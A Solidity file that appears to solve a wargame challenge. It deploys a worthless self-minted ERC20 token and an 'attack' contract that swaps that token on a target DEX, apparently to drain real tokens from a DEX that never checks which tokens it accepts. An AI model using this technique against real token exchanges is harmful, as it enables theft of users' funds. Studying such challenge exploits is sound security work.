// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IDex2 {
    function swap(address from, address to, uint amount) external;
}

contract Dex2Attack {

    address worthlessToken1;
    address worthlessToken2;
    IDex2 dex2;

    constructor(address _token1, address _token2, address _dex2) {
        worthlessToken1 = _token1;
        worthlessToken2 = _token2;
        dex2 = IDex2(_dex2);
    }

    function attackDex2(address from, address to, uint amount) external {
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        dex2.swap(from, to, amount);
    }

}


contract WorthlessToken is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}